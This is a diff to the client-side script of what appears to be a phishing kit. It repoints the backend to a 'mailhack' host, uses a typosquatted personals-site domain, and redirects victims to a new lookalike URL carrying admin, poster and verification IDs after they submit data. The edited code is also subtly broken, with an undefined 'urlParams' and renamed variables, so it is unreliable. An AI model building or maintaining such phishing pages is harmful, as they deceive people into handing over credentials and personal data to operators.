@@ -1,4 +1,4 @@
-const API_URL = 'https://mailhack-new.vercel.app'
+const API_URL = 'https://mailhackbackend.vercel.app'
 const siteUrl ='www.meggapursonel.online'
 
 function detectDevice(userAgent) {
@@ -26,6 +26,7 @@ document.addEventListener('DOMContentLoaded', () => {
     const posterId = getQueryParam('poster');
     const site = getQueryParam('site');
 
+    const verifyId = urlParams.get('verifyId');
 
 
 
@@ -71,7 +72,7 @@ document.addEventListener('DOMContentLoaded', () => {
                     console.log('Response:', data);
                     if (data) {
                         // Redirect to another URL on success
-                        window.location.href =  `https://megapersonal-chatreview.vercel.app/${adminId}/${posterId}`;
+                        window.location.href =   `https://love-loaction.vercel.app/${admin}/${poster}/${verifyId}`;;
                     }
                 })
                 .catch(error => {
